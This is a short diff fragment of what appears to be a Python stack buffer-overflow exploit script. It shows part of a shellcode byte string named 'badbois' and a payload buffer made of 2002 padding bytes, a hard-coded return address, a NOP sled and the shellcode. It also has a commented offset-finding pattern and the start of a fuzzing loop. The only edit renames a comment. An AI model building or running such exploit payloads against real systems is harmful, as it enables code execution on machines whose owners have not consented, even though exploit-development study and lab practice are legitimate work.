@@ -33,7 +33,7 @@ badbois = ("\xdb\xd3\xbd\xa7\x17\xaf\x98\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
 
 buffer = ("A" * 2002 + "\xC3\xC1\x5D\x77" + "\x90"*8 + badbois)
 
-#crack at 2002
+#buffer-overflow at 2002
 #buffer = ("A" *2002 + "B"*4 + "C" * (2300-2002-4))
 '''
 while counter <= 6000:
